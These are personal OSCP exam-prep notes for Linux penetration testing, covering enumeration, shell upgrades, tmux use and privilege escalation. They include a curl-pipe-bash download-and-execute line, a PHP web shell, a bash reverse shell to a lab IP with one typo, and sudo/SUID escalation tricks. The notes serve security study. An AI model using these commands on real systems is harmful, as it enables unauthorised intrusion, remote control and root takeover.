# OSCP Prep Notes

## Linux

Website for searching for shells through random programs such as 'vi' "living off the land binaries": [GTFObins](https://gtfobins.github.io/)

### Enumeration

find files user has access to:

```bash
find / -user <username> -ls 2>/dev/null
```

[Linux Privilege Checker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

full linux enumeration:

* [LinEnum.sh](https://github.com/rebootuser/LinEnum) 
* [LinPEAS.sh](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

download  __and __ execute script \(such as LinEnum.sh\) \[from remote host\]: `curl <url or IP>/LinEnum.sh | bash`

Locate exploits:

```bash
searchsploit <name_of_program> 
#to pull exploit code:
searchsploit -x <name/number of exploit>
```

enumerate running processes: `pspy`

enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)

Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)

enumerate info about current processes running from: `/proc/self/status`

common Local File Inclusion locations: [https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI](https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI)

### Upgrade shells:

```text
1. sudo python -c 'import pty; pty.spawn("/bin/sh")'
2. sudo perl -e 'exec "/bin/sh";'
3. sudo ruby -e 'exec "/bin/sh"'
```

php shell: `<?php system($_GET['variable_name']); ?>`

bash reverse shell:

```text
bash -i >& /dev/tct/10.10.14.148/9001 0>&1
#URL encoded: 
bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
```

nc listener: `nc -lvnp <port>`

To upgrade to fully interactive shell:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'; 
ctrl-z #[to background]
stty raw -echo; 
fg #[to return shell to foreground]
export TERM=xterm
```

### TMUX

tmux can keep alive sessions if you lose ssh sessions etc, can split panes and more:

```text
tmux new -s <session_name> 
ctrl-b = prefix key (enables addnl commands) 
+[%] vertical pane  
+["] horizontal pane 
+[alt-space] switch pane between horizontal or vertical
+[arrow_keys] move between panes 
+[z] zoom in/out on pane 
+[?] help for tmux 
+[t] timer
```

tmux plugins:

* tmux logging plugin \(get this!!\) can save log of tmux windows
* [better mouse mode](https://github.com/NHDaly/tmux-better-mouse-mode)

### Privilege Escalation

[https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)

execute command as another user: `sudo -u <username> [command]`

execute any command while in less: `!<cmd>`

Privilege Escalation to Root with suid /bin/less: `chmod 47555 /bin/less`

Privilege Escalation to Root with find: `sudo find /etc -exec sh -i \;`

wildcard injection: \[NEED MORE HERE\]

```bash
mawk 'BEGIN {system("/bin/sh")}'
```

```text
1. [user@localhost]$ sudo vi
2. :shell
3. [root@localhost]#

1. [user@localhost]$ sudo less file.txt
2. !bash
3. [root@localhost]#

1. [user@localhost]$ sudo more long_file.txt
2. !bash
3. [root@localhost]#
Note: for this method to work, the attacker has to read a file that is longer than one page
```

### Misc Linux

Raw memory location so no files on disk: `/dev/shm/`

list all running commands:

```bash
ps -eo command`
#change delimiter to \n instead of <space> (loop by line): 
IFS=$'\n'
#Then loop through each line in output: 
for i in $(ps -eo command); do echo $i; done
```

'new' netstat: `ss -lnp | grep 9001` \#check if any connections on port 9001

get user's superuser permissions: `sudo -l`

copy files to local machine without file transfer:

```bash
base64 -w 0 /path/of/file/name.file 
#copy base64 then: 
echo -n <base64material> | base64 -d > filename.file
```

pretty print text in console? \[Haven't looked this one up\]: `jq`

web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)

convert rpm to debian packages: `alien <file.rpm>`

Makes PWD part of path so dont need './' \[NOT RECOMMENDED!\]: `export PATH='pwd':$PATH`

cycle through previous arguments: `alt-.`

move between "words" on a command line `ctrl-[arrow_keys]`
